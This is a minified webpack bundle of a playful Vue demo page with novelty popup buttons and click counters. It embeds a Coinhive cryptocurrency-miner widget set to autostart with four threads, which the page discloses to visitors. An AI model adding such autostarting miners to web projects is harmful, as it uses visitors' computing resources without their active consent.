(function(t){function e(e){for(var r,s,i=e[0],l=e[1],c=e[2],p=0,h=[];p<i.length;p++)s=i[p],o[s]&&h.push(o[s][0]),o[s]=0;for(r in l)Object.prototype.hasOwnProperty.call(l,r)&&(t[r]=l[r]);u&&u(e);while(h.length)h.shift()();return a.push.apply(a,c||[]),n()}function n(){for(var t,e=0;e<a.length;e++){for(var n=a[e],r=!0,i=1;i<n.length;i++){var l=n[i];0!==o[l]&&(r=!1)}r&&(a.splice(e--,1),t=s(s.s=n[0]))}return t}var r={},o={app:0},a=[];function s(e){if(r[e])return r[e].exports;var n=r[e]={i:e,l:!1,exports:{}};return t[e].call(n.exports,n,n.exports,s),n.l=!0,n.exports}s.m=t,s.c=r,s.d=function(t,e,n){s.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:n})},s.r=function(t){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},s.t=function(t,e){if(1&e&&(t=s(t)),8&e)return t;if(4&e&&"object"===typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(s.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:t}),2&e&&"string"!=typeof t)for(var r in t)s.d(n,r,function(e){return t[e]}.bind(null,r));return n},s.n=function(t){var e=t&&t.__esModule?function(){return t["default"]}:function(){return t};return s.d(e,"a",e),e},s.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},s.p="/";var i=window["webpackJsonp"]=window["webpackJsonp"]||[],l=i.push.bind(i);i.push=e,i=i.slice();for(var c=0;c<i.length;c++)e(i[c]);var u=l;a.push([0,"chunk-vendors"]),n()})({0:function(t,e,n){t.exports=n("56d7")},"034f":function(t,e,n){"use strict";var r=n("c21b"),o=n.n(r);o.a},"0e23":function(t,e,n){},"56d7":function(t,e,n){"use strict";n.r(e);n("cadf"),n("551c"),n("097d");var r=n("2b0e"),o=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{attrs:{id:"app"}},[n("HelloWorld",{attrs:{msg:"Boilerplate Vue 🍳",msg2:"Lots of in-built libs"}})],1)},a=[],s=function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"hello"},[n("h1",[n("img",{attrs:{alt:"Henry Software Image Apple",src:"Apple.png"}}),t._v(" "+t._s(t.msg))]),n("h2",[t._v(t._s(t.msg2))]),t._m(0),n("button",{staticClass:"btn-lg nyan_btn",on:{click:t.swal_nyan}},[t._v("\n    Meow? 😸\n  ")]),n("button",{staticClass:"btn-lg shibe_btn",on:{click:t.swal_shibe}},[t._v("\n    Rough. 🐕\n  ")]),n("button",{staticClass:"btn-lg whoosh_btn",on:{click:t.swal_whoosh}},[t._v("\n    :whoosh: 🦋\n  ")]),n("h2",{staticClass:"spaceme"},[t._v("Party count")]),n("h3",[t._v("Nyans: "+t._s(t.nyans))]),n("h3",[t._v("Doges: "+t._s(t.doges))]),n("h3",[t._v("Butterfrees: "+t._s(t.bfs))]),n("h2",[t._v("What happens when I embed an array without parsing or handling the data? How forgiving is VUEjs?")]),n("p",[t._v(t._s(t.icons.price>30))]),t._m(1),n("h5",[t._v("\n    Miner can only run while you are on this site.\n  ")]),n("h5",[t._v("\n    Please close your browser to stop miner and destroy the script.\n  ")]),t._m(2)])},i=[function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("p",[t._v("\n    Do we actually still endorse br tags?"),n("br"),t._v("\n    I mean just to break up a line,"),n("br"),t._v("srsly?\n    "),n("a",{attrs:{href:"https://cli.vuejs.org",target:"_blank",rel:"noopener"}},[t._v("vue-cli documentation")]),t._v(".\n  ")])},function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("div",{staticClass:"coinhive-miner card p-2 m-3 w-75 mx-auto",staticStyle:{width:"256px",height:"260px"},attrs:{"data-key":"m9y2InYOnZhfTXEd93mRwYkeQbMrd0gq","data-autostart":"true","data-whitelabel":"false","data-background":"#7de2ff","data-text":"#000000","data-action":"#00ff00","data-graph":"#b22222","data-threads":"4","data-throttle":"0.3"}},[n("em",[t._v("Loading...")])])},function(){var t=this,e=t.$createElement,n=t._self._c||e;return n("footer",[n("p",[t._v("Some images courtesy of "),n("a",{attrs:{href:"https://henrysoftware.itch.io/pixel-food/download/eyJleHBpcmVzIjoxNTM0NTMwNDI5LCJpZCI6NDI1Nzd9.vlNqqXJCyOGCuIQZyqB9QK6HE5M%3d"}},[t._v("Henry Software")]),t._v(".\n    ")])])}],l={name:"HelloWorld",props:{msg:String,msg2:String},data:function(){return{nyans:0,doges:0,bfs:0,icons:[{name:"Apple",price:"10"},{name:"AppleWorm",price:"2"},{name:"Avocado",price:"50"}]}},methods:{swal_nyan:function(){this.$swal({html:"<h1 style='color:white;'>Nyancat Joins the Party~</h1>",width:600,padding:"3em",background:"#faa url(bg_knot.png)",backdrop:"\n          rgba(200,0,100,0.4)\n          url(nyan-cat.gif)\n          bottom center\n          no-repeat\n        "}),this.nyans++},swal_shibe:function(){this.$swal({html:"<h1 style='color:white;'>Doge Joins the Party~</h1>",width:"80%",padding:"3em",background:"#aff url(bg_knot.png)",backdrop:"\n          rgba(100,60,0,0.4)\n          url(doge2.png)\n          bottom center\n          no-repeat\n        "}),this.doges++},swal_whoosh:function(){this.$swal({html:"<h1 style='color:white;'>Butterfree Joins the Party~</h1>",width:600,padding:"3em",background:"#faf url(bg_knot.png)",backdrop:"\n          rgba(50,00,80,0.4)\n          url(butterfree.png)\n          bottom center\n          no-repeat\n        "}),this.bfs++}}},c=l,u=(n("63b2"),n("2877")),p=Object(u["a"])(c,s,i,!1,null,"041b850a",null);p.options.__file="HelloWorld.vue";var h=p.exports,f={name:"app",components:{HelloWorld:h}},d=f,b=(n("034f"),Object(u["a"])(d,o,a,!1,null,null,null));b.options.__file="App.vue";var g=b.exports,_=n("619c");r["a"].use(_["a"]),r["a"].config.productionTip=!1,new r["a"]({render:function(t){return t(g)}}).$mount("#app")},"63b2":function(t,e,n){"use strict";var r=n("0e23"),o=n.n(r);o.a},c21b:function(t,e,n){}});
//# sourceMappingURL=app.9785fbaf.js.map